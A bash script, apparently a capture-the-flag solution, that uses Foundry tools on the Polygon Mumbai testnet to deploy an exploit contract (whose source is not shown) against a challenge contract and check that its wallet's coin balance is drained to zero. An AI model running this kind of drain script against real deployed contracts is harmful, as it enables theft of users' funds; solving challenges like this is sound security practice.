#!/bin/bash

PRIVATE_KEY="$1"
if [ -z "$PRIVATE_KEY" ]
then
    echo "PRIVATE_KEY must be passed as the first argument" >&2
    exit 1
fi

CONTRACT_ADDRESS="$2"
if [ -z "$CONTRACT_ADDRESS" ]
then
    echo "CONTRACT_ADDRESS must be passed as the second argument" >&2
    exit 1
fi

echo "[INFO] Getting coin and wallet addresses.." >&2
COIN_ADDRESS=$(cast call \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    "$CONTRACT_ADDRESS" \
    "coin()(address)")
echo "[INFO] Coin: $COIN_ADDRESS" >&2

WALLET_ADDRESS=$(cast call \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    "$CONTRACT_ADDRESS" \
    "wallet()(address)")
echo "[INFO] Wallet: $WALLET_ADDRESS" >&2

echo "[INFO] Getting wallet balance..." >&2
BALANCE=$(cast call \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    "$COIN_ADDRESS" \
    "balances(address)(uint256)" \
    "$WALLET_ADDRESS")
echo "[INFO] Wallet balance: $BALANCE" >&2

echo "[INFO] Deploying exploit contract..." >&2
EXPLOIT_ADDRESS=$(forge create \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    --private-key $PRIVATE_KEY \
    src/Exploit.sol:Exploit \
    | grep "Deployed to:" \
    | awk '{print $3}')

if [ $? -ne 0 ] || [ -z "$EXPLOIT_ADDRESS" ]
then
    echo "[ERROR] Exploit contract deployment failed" >&2
    exit 1
fi
echo "[INFO] Contract deployed to $EXPLOIT_ADDRESS" >&2

echo "[INFO] Executing exploit..." >&2
cast send \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    --private-key $PRIVATE_KEY \
    "$EXPLOIT_ADDRESS" \
    "exploit(address)" \
    "$CONTRACT_ADDRESS"

echo "[INFO] Getting wallet balance..." >&2
BALANCE=$(cast call \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    "$COIN_ADDRESS" \
    "balances(address)(uint256)" \
    "$WALLET_ADDRESS")
echo "[INFO] Wallet balance: $BALANCE" >&2

if [ $BALANCE -ne 0 ]
then
    echo "[ERROR] Could not drain funds" >&2
    exit 1
fi

echo "solved!"
